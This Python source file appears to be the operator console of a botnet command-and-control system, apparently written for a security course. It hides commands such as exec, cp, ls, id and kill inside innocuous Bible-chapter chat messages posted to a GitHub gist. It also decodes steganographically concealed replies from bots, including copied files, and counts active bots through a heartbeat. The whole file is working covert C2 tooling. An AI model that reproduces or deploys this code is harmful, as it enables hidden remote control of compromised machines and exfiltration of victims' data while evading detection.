import sys
import uuid
from datetime import datetime
from pytimedinput import timedInput

sys.path.append('..')
from common.utils import add_message, check_chat_file, get_replies_to_msg_id, read_attachment, reset_gist
from common.utils import CONTROLLER_NICK_NAME
from common.gist import init_gist
from common.chapters import get_chapter_for_path_encoding, get_chapter_for_command, read_chapter
from common.steganography import encode_to_text, decode_from_text


HEARTBEAT_TIME = 60


def encode_path(pth):
    chapter_for_encoding = get_chapter_for_path_encoding()
    chapter_text = read_chapter(chapter_for_encoding)
    encoded_pth, used_length = encode_to_text(pth, chapter_text)
    return encoded_pth[0:used_length]


def check_heartbeat(minutes):
    print(f'Starting to check heartbeat for {minutes} minutes...', flush=True)
    print('Type "stop" to stop it', flush=True)
    for i in range(minutes):
        msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
        now = datetime.now()

        for _ in range(10):
            x, _ = timedInput('> ', timeout=6)
            print('\033[A\033[A')
            if x == 'stop':
                print(f'Stopping heartbeat...', flush=True)
                return

        replies = get_replies_to_msg_id(msg_id)
        bot_names = list(map(lambda x: x[0], replies))
        bot_names_str = f' ({"".join(bot_names)})' if len(bot_names) > 0 else ''
        print(f'({i + 1}/{minutes}) Active bots ({now}): {len(bot_names)}{bot_names_str}', flush=True)
    print(f'Heartbeat finished...', flush=True)


def process_cmd(cmd):
    if len(cmd) == 0:
        return

    cmd_parts = cmd.split(' ')

    if cmd == 'w' or cmd == 'id' or cmd == 'kill':
        print(f'Adding {cmd} command...')
        chapter = get_chapter_for_command(cmd)
        msg_id = add_message(f'Send me text of chapter {chapter}, please', CONTROLLER_NICK_NAME)
        print(f'Added {cmd} command as message with id {msg_id}', flush=True)

    elif len(cmd_parts) == 2 and (cmd_parts[0] == 'ls' or cmd_parts[0] == 'cp' or cmd_parts[0] == 'exec'):
        print(f'Adding {cmd_parts[0]} command...')
        chapter = get_chapter_for_command(cmd_parts[0])
        attach = {
            'name': str(uuid.uuid4()) + '.txt',
            'content': encode_path(cmd_parts[1]),
        }
        msg_id = add_message(f'Is this attachment part of chapter {chapter}?', CONTROLLER_NICK_NAME, attachment=attach)
        print(f'Added {cmd} command as message with id {msg_id}', flush=True)

    elif len(cmd_parts) == 2 and cmd_parts[0] == 'decode' and cmd_parts[1].isdigit():
        msg_id = int(cmd_parts[1])
        print(f'Decoding replies for message {msg_id}...')
        replies = get_replies_to_msg_id(msg_id)
        if len(replies) == 0:
            print(f'No reply for message {msg_id} found', flush=True)
        else:
            for reply in replies:
                text = read_attachment(reply[3])
                decoded = decode_from_text(text)
                print(f'Reply for message {msg_id} by {reply[0]}:')
                print(decoded, flush=True)

    elif cmd == 'reset gist':
        reset_gist()
        print('Gist reset to initial message', flush=True)

    elif len(cmd_parts) == 2 and cmd_parts[0] == 'heartbeat' and cmd_parts[1].isdigit():
        check_heartbeat(int(cmd_parts[1]))

    else:
        print(f'Unknown command: {cmd}', flush=True)


def run():
    print('Controller is starting...')
    init_gist()
    check_chat_file()
    print(f'Controller is running as {CONTROLLER_NICK_NAME}...')

    while True:
        cmd = input('BSY CC > ')
        if cmd == 'exit' or cmd == 'quit':
            print('Exiting BSY CC...')
            break
        process_cmd(cmd)


if __name__ == '__main__':
    run()
